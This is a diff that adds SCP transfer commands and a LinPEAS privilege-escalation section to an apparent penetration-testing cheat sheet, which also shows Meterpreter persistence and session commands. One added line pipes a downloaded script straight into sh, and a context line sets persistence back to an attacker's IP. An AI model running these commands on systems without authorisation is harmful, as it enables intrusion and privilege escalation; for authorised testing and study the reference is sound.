@@ -19,6 +19,11 @@ ssh-keygen -t rsa -b 2048  # Generates a 2048-bit RSA SSH key pair for passwordl
 ssh-copy-id user@backup_server  # Copies your public SSH key to a remote server, enabling passwordless login.
 ftp -p <host> <port> <username> <pass> # FTP connection in passive mode. <port>, <username> and <pass> are optional
 
+### SCP File Transfer
+scp -i <private-key> <file-to-transfer> <username>@<ip-address>:<path-to-store> # Copies a local file to a remote host over SSH using a private key for authentication
+scp -i <private-key> <username>@<ip-address>:<path-to-file> <local-destination> # Copies a file from a remote host to the local machine using a private key
+scp -r -i <private-key> <local-directory> <username>@<ip-address>:<path-to-store> # Recursively copies an entire directory to a remote host
+
 # Backup
 
 ## rsync
@@ -298,6 +303,14 @@ persistence -U -i 5 -p <port> -r <attacker's IP Address> # Establishes persisten
 background # Backgrounds the current session, returning to the msfconsole prompt
 sessions -l # Lists all active sessions
 sessions -i <ID> # Interacts with a specific session by ID
+
+### Privilege Escalation Enumeration
+
+#### LinPEAS
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh # Downloads the latest LinPEAS script to the current directory
+bash linpeas.sh -a -N > linpeas_results.txt # Runs LinPEAS with all checks (-a) and no colored output (-N), saving results to a file
+./linpeas.sh > linpeas_results.txt # Runs LinPEAS with default checks and saves the output to a file
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh # Downloads and executes LinPEAS directly in memory without saving to disk
 
 ## Wpscan
 
